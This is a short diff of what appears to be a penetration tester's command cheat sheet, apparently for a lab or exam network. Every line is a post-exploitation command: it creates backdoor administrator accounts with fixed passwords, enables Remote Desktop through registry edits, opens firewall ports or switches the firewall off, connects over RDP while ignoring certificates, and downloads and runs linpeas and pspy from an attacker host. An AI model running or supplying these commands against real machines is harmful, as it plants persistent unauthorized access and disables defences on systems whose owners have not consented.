@@ -216,10 +216,10 @@ netsh firewall set service remoteadmin enable
 net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
 
 netsh advfirewall set allprofiles state off
-net user /add backdoor Password123!
+net user /add backdoor Password123
 net localgroup administrators /add backdoor
 net localgroup "Remote Desktop Users" backdoor /add
-xfreerdp /v:192.168.140.101 /u:backdoor /p:Password123 /cert:ignore +clipboard
+xfreerdp /v:192.168.120.101 /u:backdoor /p:Password123 /cert:ignore +clipboard
 
 curl http://192.168.45.163:8000/linpeas.sh -o linpeas.sh;chmod +x linpeas.sh;
 curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
